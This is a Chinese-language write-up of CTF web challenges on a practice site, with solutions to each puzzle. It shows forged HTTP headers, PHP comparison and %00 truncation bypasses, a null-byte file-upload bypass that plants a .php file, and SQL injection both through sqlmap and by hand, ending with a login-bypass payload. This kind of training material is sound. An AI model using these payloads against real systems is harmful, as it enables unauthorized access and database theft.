## 猫抓老鼠

检查请求头,发现 `content-row: MTU0Nzk5MTA1OQ==`
输入得到Flag: `KEY: #WWWnsf0cus_NET#`

## 头有点大

根据提示,抓包
伪造.NET 浏览器 国籍
修改为
```
GET /sHeader/ HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 6.1/.NET CLR 9.9; Win64; x64; rv:64.0) Gecko/20100101 IE
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-gb,en;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1546692582; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*185270%2CnickName%3Affdy; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1547962050
Upgrade-Insecure-Requests: 1
```
GO,得到Flag: The key is:HTTpH34der

## 貌似有点难

查看代码,发现要将IP伪装为1.1.1.1
在伪造IP后响应中提示还要伪造跳转网页
抓包
伪造IP 跳转网页
修改为
```
GET /phpaudit/ HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Forwarded-For: 1.1.1.1 ##IP
Referer: https://www.google.com  ##跳转网页
Connection: close
Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1546692582; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*185270%2CnickName%3Affdy; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1547962050
Upgrade-Insecure-Requests: 1
```
得到Flag: Key is SimCTF{daima_shengji}

## PHP大法
进入链接,看见源码
```php
<?php
if(eregi("hackerDJ",$_GET[id])) { #比较id和字符,如果相等返回true
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]); #对id进行url解密
if($_GET[id] == "hackerDJ") 如果id等于字符,得到Flag
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>


<br><br>
Can you authenticate to this website?
```
分析代码发现应对字符进行URL编码,但需要加密两次,因为浏览器会解密一次
网上的在线编码一般不会处理英文,用这个[网站](http://tool.bugku.com/safe/url.php)
GET 提交,得到 Flag: DUTCTF{PHP_is_the_best_program_language}

## what a fuck!这是什么鬼东西?

jother 编码 [这里](https://wps2015.org/drops/drops/jother%E7%BC%96%E7%A0%81%E4%B9%8B%E8%B0%9C.html)
直接在 Console( )里运行得到Flag : Ihatejs

## NSCTF web200

![](http://ctf5.shiyanbar.com/web/web200.jpg)

分析代码,密文首先被反转,再自增 1 
base64-encode 后再反转
ROT13 加密,得到密文 :
`a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws`

先逆转该过程就 OK 了

[ROT13 解密](http://www.mxcz.net/tools/rot13.aspx)得 : 

`n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf`

翻转 :

`fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n`

base64-decode : 
```
~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg
```
自减 1 后翻转得 :

 `flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}`

## FALSE

查看源码:
```php
<?php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
    echo '<p>Login first!</p>';
?>
```
发现需要构造 str1!=str2 并且两串的 sha1 值相等
直接构造肯定不现实
根据题目提示,应构造两者的返回值为 false, 即 false===false
sha1 与 MD5 都不能处理数组,所以我们构造两个数组 GET 提交
得到Flag : CTF{t3st_th3_Sha1}

## Guess Next Session
查看提示代码:
```php
<?php
session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}

mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
```
分析代码,发现上面的随机数只是个坑,应该满足条件`$_GET['password']  ==  $_SESSION['password']`
Burp 抓包,将 Cookie 删除,并将 password 置为空 
GO 得到Flag : CTF{Cl3ar_th3_S3ss1on}

## Once More
查看代码 : 
```php
<?php
if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
	{
		echo '<p>You password must be alphanumeric</p>';
	}
	else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
	{
		if (strpos ($_GET['password'], '*-*') !== FALSE)
		{
			die('Flag: ' . $flag);
		}
		else
		{
			echo('<p>*-* have not been found</p>');
		}
	}
	else
	{
		echo '<p>Invalid password</p>';
	}
}
?>
```
发现需要提交一个长度小于8,值大于99999999的数字,并且能从中找到`*-*`字符
前两个条件加题干不难想到科学计数法,关键是ereg函数的审计和字符
这里可以使用%00截断,ereg函数会从%00处停止验证
GET 提交 `password=9e9%00*-*` 得到 Flag : `CTF{Ch3ck_anD_Ch3ck}`
**注意%会被URL编码成%25,有点坑**
## 上传绕过

没有 js,推测为%00上传绕过 
Burp 抓包,在路径上添加 `1.php+`,将 `+` 的 Hex 值改为00,GO 
浏览器会自动略去 `+` 及后面的字符,上传的文件名就会变成 `1.php`
得到Flag : `flag{SimCTF_huachuan}`
## 看起来有点简单!
Sql 注入题,直接用 Sqlmap 就能搞定

1. `--current-db` 发现库名为 my_db
2. `-D my_db --tables` 发现表名为 thiskey
3. `-D my_db -T thiskey --columns` 发现字段名为 k0y
4. `-D my_db -T thiskey -C k0y --dump` 得到Flag :  whatiMyD91dump

手工注入: 

1. `id=1'` 报错发现数据库类型为 MySQL 
2. `id=1 and 1=1` 与 `id=1 and 1=2` 回显不同,判断存在注入点
3. `id=1 order by 1` 3 的时候报错,说明字段数为 2
4. `id=1 union select 1,schema_name  from information_schema.schemata` 查询数据库名称发现 my_db 和 test 两个数据库
5. `id=1 union select 1,table_name from information_schema.tables where table_schema=my_db` 查询数据库中的表名 thiskey
6. `id=1 union select 1,column_name from information_schema.columns where table_schema='my_db'` 查询表中字段名,发现 k0y
7. `id=1 union select 1,k0y from thiskey` 得到Flag : whatiMyD91dump

## 程序逻辑问题 
user=eren%27%20union%20select%20md5(123)#&pass=123
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTk1Njc3Njg0NiwtMTY5MjMyMzQ0MiwzMD
E1MThdfQ==
-->